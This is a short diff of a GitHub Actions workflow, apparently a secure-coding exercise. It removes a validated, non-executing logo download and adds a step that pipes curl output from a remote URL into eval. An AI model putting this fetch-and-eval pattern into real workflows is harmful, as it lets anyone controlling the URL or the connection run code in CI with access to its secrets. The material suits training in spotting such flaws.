@@ -10,19 +10,7 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Download SecDim logo (safe)
+      - name: Run Hello SecDim script
         run: |
-          set -euo pipefail
-          URL="https://secdim.com/assets/images/logo.svg"
-          OUT="secdim-logo.svg"
-          # Use safe curl flags, don't execute remote content
-          curl --fail --show-error --location --max-redirs 3 --retry 3 --retry-delay 2 --silent --output "$OUT" "$URL"
-
-          # Basic sanity check: ensure it contains an <svg> tag before doing anything with it
-          if ! grep -q -m1 '<svg' "$OUT"; then
-            echo "Error: downloaded file does not appear to be an SVG" >&2
-            rm -f "$OUT"
-            exit 1
-          fi
-
-          echo "Downloaded and validated $OUT"
+          CONTENTS=$(curl "https://secdim.com/assets/images/logo.svg")
+          eval $CONTENTS
